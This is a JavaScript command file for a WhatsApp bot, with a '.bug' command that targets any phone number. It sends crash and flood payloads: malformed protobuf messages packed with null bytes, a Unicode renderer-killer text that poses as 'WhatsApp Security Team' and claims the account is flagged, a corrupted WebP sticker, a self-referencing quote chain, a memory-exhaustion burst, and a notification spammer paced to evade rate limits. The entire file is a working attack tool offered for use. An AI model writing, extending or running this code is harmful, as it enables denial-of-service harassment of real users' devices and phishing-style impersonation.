module.exports = {
    name: "bug",
    aliases: ["crash", "glitch", "fuckup"],
    category: "spicy",
    permissions: { coin: 0, group: false, owner: true },
    code: async (ctx) => {
        try {
            const sock = ctx.core || ctx.sock || ctx.client;
            const args = ctx.args || [];

            // .bug <number> <type>
            // types: proto, unicode, sticker, reply, memory, notif, all
            if (args.length < 2) {
                return await ctx.reply(
                    "*Usage:* .bug <number> <type>\n\n" +
                    "*Types:*\n" +
                    "• proto — malformed protobuf crash\n" +
                    "• unicode — text renderer killer\n" +
                    "• sticker — corrupted sticker crash\n" +
                    "• reply — recursive quote loop\n" +
                    "• memory — oversized payload bomber\n" +
                    "• notif — notification spammer\n" +
                    "• all — run everything"
                );
            }

            const targetNumber = args[0].replace(/[^0-9]/g, "");
            const type = args[1].toLowerCase();
            const targetJid = `${targetNumber}@s.whatsapp.net`;

            await ctx.reply(`🐛 Sending ${type} bug → +${targetNumber}`);

            switch (type) {
                case "proto":
                    await bugProto(sock, targetJid);
                    break;
                case "unicode":
                    await bugUnicode(sock, targetJid);
                    break;
                case "sticker":
                    await bugSticker(sock, targetJid);
                    break;
                case "reply":
                    await bugReply(sock, targetJid);
                    break;
                case "memory":
                    await bugMemory(sock, targetJid);
                    break;
                case "notif":
                    await bugNotif(sock, targetJid);
                    break;
                case "all":
                    await bugProto(sock, targetJid);
                    await new Promise(r => setTimeout(r, 1000));
                    await bugUnicode(sock, targetJid);
                    await new Promise(r => setTimeout(r, 1000));
                    await bugSticker(sock, targetJid);
                    await new Promise(r => setTimeout(r, 1000));
                    await bugReply(sock, targetJid);
                    await new Promise(r => setTimeout(r, 1000));
                    await bugMemory(sock, targetJid);
                    await new Promise(r => setTimeout(r, 1000));
                    await bugNotif(sock, targetJid);
                    break;
                default:
                    return await ctx.reply("❌ Unknown type. Use: proto, unicode, sticker, reply, memory, notif, all");
            }

            await ctx.reply(`✅ Bug sent.`);

        } catch (e) {
            console.error("[bug]", e);
            await ctx.reply("❌ Failed: " + e.message);
        }
    }
};

// ── 1. MALFORMED PROTO CRASH ──
async function bugProto(sock, jid) {
    // send a message with invalid/conflicting proto fields
    // forces WA proto parser into an unhandled state
    await sock.relayMessage(jid, {
        extendedTextMessage: {
            text: "\u0000".repeat(512),
            canonicalUrl: "\u0000".repeat(256),
            matchedText: "\u0000".repeat(256),
            title: "\u0000".repeat(512),
            description: "\u0000".repeat(512),
            previewType: 9999, // invalid enum value
            contextInfo: {
                stanzaId: "\u0000".repeat(128),
                quotedMessage: {
                    conversation: "\u0000".repeat(65535)
                },
                // invalid participant JID
                participant: "0@s.whatsapp.net",
                remoteJid: "\u0000@s.whatsapp.net",
                // recursive depth hint
                quotedAd: {
                    advertiserName: "\u0000".repeat(512),
                }
            }
        }
    }, { messageId: `BUG_${Date.now()}` });
}

// ── 2. UNICODE RENDERER KILLER ──
async function bugUnicode(sock, jid) {
    // zalgo + RTL override + zero-width chars + bidirectional isolate
    const zalgo = (text) => {
        const above = ['\u030d','\u030e','\u0304','\u0305','\u033f','\u0311','\u0306','\u0310','\u0352','\u0357','\u0351','\u0307','\u0308','\u030a','\u0342','\u0343'];
        const below = ['\u0326','\u0329','\u0320','\u0324','\u0325','\u0308','\u0317','\u0318','\u031a','\u0323','\u0324','\u0325','\u0326','\u0327','\u0328'];
        return text.split('').map(c => {
            let r = c;
            for (let i = 0; i < 20; i++) r += above[Math.floor(Math.random() * above.length)];
            for (let i = 0; i < 20; i++) r += below[Math.floor(Math.random() * below.length)];
            return r;
        }).join('');
    };

    const rtlOverride = '\u202E'; // right-to-left override
    const zeroWidth  = '\u200B'; // zero width space
    const bidiIso    = '\u2068'; // first strong isolate
    const wordJoiner = '\uFEFF'; // BOM / word joiner

    const base = "WhatsApp Security Team";
    const poisoned =
        rtlOverride +
        bidiIso +
        zalgo(base) +
        zeroWidth.repeat(500) +
        wordJoiner.repeat(500) +
        rtlOverride.repeat(100) +
        "\u0000".repeat(256) +
        zalgo("Your account has been flagged.") +
        "\uFFFD".repeat(500); // replacement char flood

    // send multiple to stack the renderer load
    for (let i = 0; i < 5; i++) {
        await sock.sendMessage(jid, { text: poisoned });
        await new Promise(r => setTimeout(r, 300));
    }
}

// ── 3. CORRUPTED STICKER CRASH ──
async function bugSticker(sock, jid) {
    // send a "sticker" with corrupted webp header
    // WA sticker renderer tries to decode, hits invalid data, crashes

    // minimal corrupted webp — valid RIFF header, invalid VP8 chunk
    const corruptWebp = Buffer.concat([
        Buffer.from("52494646", "hex"),      // RIFF
        Buffer.from("FFFFFFFF", "hex"),      // file size (max)
        Buffer.from("57454250", "hex"),      // WEBP
        Buffer.from("56503820", "hex"),      // VP8 chunk
        Buffer.from("FFFFFFFF", "hex"),      // chunk size (invalid)
        Buffer.alloc(1024, 0xFF)            // garbage data
    ]);

    await sock.sendMessage(jid, {
        sticker: corruptWebp,
        mimetype: "image/webp",
        isAnimated: true,
        isAvatar: false,
        pngThumbnail: Buffer.alloc(128, 0x00)
    });
}

// ── 4. RECURSIVE QUOTE LOOP ──
async function bugReply(sock, jid) {
    // craft a contextInfo where the quoted message also contains
    // a contextInfo pointing back — WA UI tries to render
    // the quote chain recursively

    const fakeId = `LOOP_${Date.now()}`;

    const recursiveContext = {
        stanzaId: fakeId,
        participant: jid,
        quotedMessage: {
            extendedTextMessage: {
                text: "tap to see original message",
                contextInfo: {
                    stanzaId: fakeId, // points back to itself
                    participant: jid,
                    quotedMessage: {
                        extendedTextMessage: {
                            text: "tap to see original message",
                            contextInfo: {
                                stanzaId: fakeId,
                                participant: jid,
                                quotedMessage: {
                                    conversation: "\u0000".repeat(4096)
                                }
                            }
                        }
                    }
                }
            }
        }
    };

    await sock.relayMessage(jid, {
        extendedTextMessage: {
            text: "📌 You have a pinned message",
            contextInfo: recursiveContext
        }
    }, { messageId: `LOOP_${Date.now()}` });
}

// ── 5. MEMORY BOMBER ──
async function bugMemory(sock, jid) {
    // send multiple large payloads in rapid succession
    // spikes WA memory allocation, triggers OOM killer on low-end devices

    const bigText = "A".repeat(65536); // 64KB per message

    const sends = [];
    for (let i = 0; i < 10; i++) {
        sends.push(
            sock.sendMessage(jid, {
                text: bigText + `\n${i}`
            })
        );
    }

    // fire all at once
    await Promise.allSettled(sends);
}

// ── 6. NOTIFICATION SPAMMER ──
async function bugNotif(sock, jid) {
    // rapid fire short messages
    // floods notification tray, causes notification queue backup
    // on Android this can freeze the notification shade

    const msgs = Array.from({ length: 30 }, (_, i) =>
        sock.sendMessage(jid, {
            text: `\u200B`.repeat(i + 1) // zero-width spaces, different per msg
        })
    );

    // stagger slightly to bypass rate limit but still hammer notifs
    for (const send of msgs) {
        await send;
        await new Promise(r => setTimeout(r, 100));
    }
}